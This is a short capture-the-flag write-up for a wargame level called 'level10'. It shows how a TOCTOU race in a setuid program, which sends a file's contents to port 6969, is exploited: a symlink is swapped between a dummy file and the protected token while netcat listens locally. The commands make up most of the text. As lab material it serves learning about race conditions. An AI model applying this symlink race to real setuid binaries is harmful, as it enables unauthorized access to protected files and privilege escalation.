# Level10
## Step by step
- In the user `level10` home directory, there is a file
  ```bash
  > ls
  -rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
  -rw-------  1 flag10  flag10     26 Mar  5  2016 token
  ```
- The programm `level10` print the content of a file pass in argument to a port that is listening on 6969
  ```bash
  > echo coucou >/tmp/test
  > nc -l localhost 6969

  
  > ./level /tmp/test 127.0.0.1
  coucou # from the nc command
  ```
- When we try to pass `token` file as argument the program print `You don't have access to token`
- To avoid this error check with access
  ```bash
  > cat <<hey >/tmp/script.sh
  > touch /tmp/tmp;
  > ln -sf /tmp/tmp /tmp/exploit
  > ./level10 /tmp/exploit 127.0.0.1 &
  > ln -sf ~/token /tmp/exploit
  > hey

  > nc -l localhost 6969
  > /tmp/script.sh
  .*( )*.
  XXX
  ```
